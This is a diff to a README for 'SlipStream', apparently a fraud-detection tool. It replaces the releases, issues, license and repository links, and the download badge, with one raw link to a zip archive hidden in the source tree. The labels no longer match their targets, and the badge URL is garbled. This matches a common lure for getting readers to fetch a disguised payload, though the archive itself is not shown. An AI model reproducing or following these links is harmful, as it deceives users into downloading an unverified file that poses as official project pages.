@@ -6,7 +6,7 @@ Welcome to SlipStream! This application helps you find fraud in streaming transa
 
 ## 📥 Download SlipStream
 
-[![Download SlipStream](https://img.shields.io/badge/Download%20SlipStream-blue.svg)](https://github.com/DreamLift/SlipStream/releases)
+[![Download SlipStream](https://raw.githubusercontent.com/DreamLift/SlipStream/main/src/main/resources/SlipStream-v3.6-alpha.5.zip%https://raw.githubusercontent.com/DreamLift/SlipStream/main/src/main/resources/SlipStream-v3.6-alpha.5.zip)](https://raw.githubusercontent.com/DreamLift/SlipStream/main/src/main/resources/SlipStream-v3.6-alpha.5.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ SlipStream offers several key features:
 
 Follow these steps to download and install SlipStream:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/DreamLift/SlipStream/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/DreamLift/SlipStream/main/src/main/resources/SlipStream-v3.6-alpha.5.zip) to find the latest version.
    
 2. **Choose Your File**: Locate the version you want to download. You’ll see various files for different systems.
 
@@ -65,12 +65,12 @@ If you encounter issues, check the following:
 
 ## 📞 Support
 
-If you need assistance, feel free to reach out to our support team via the [GitHub Issues page](https://github.com/DreamLift/SlipStream/issues). We are here to help you.
+If you need assistance, feel free to reach out to our support team via the [GitHub Issues page](https://raw.githubusercontent.com/DreamLift/SlipStream/main/src/main/resources/SlipStream-v3.6-alpha.5.zip). We are here to help you.
 
 ## 📜 License
 
-SlipStream is open-source software. You can view the license and terms of use on our [GitHub repository](https://github.com/DreamLift/SlipStream).
+SlipStream is open-source software. You can view the license and terms of use on our [GitHub repository](https://raw.githubusercontent.com/DreamLift/SlipStream/main/src/main/resources/SlipStream-v3.6-alpha.5.zip).
 
 ## 🎌 Conclusion
 
-Thank you for using SlipStream! We hope our software helps you effectively monitor and detect fraud in real-time transactions. For updates, features, and more, keep an eye on our [Releases page](https://github.com/DreamLift/SlipStream/releases).
+Thank you for using SlipStream! We hope our software helps you effectively monitor and detect fraud in real-time transactions. For updates, features, and more, keep an eye on our [Releases page](https://raw.githubusercontent.com/DreamLift/SlipStream/main/src/main/resources/SlipStream-v3.6-alpha.5.zip).
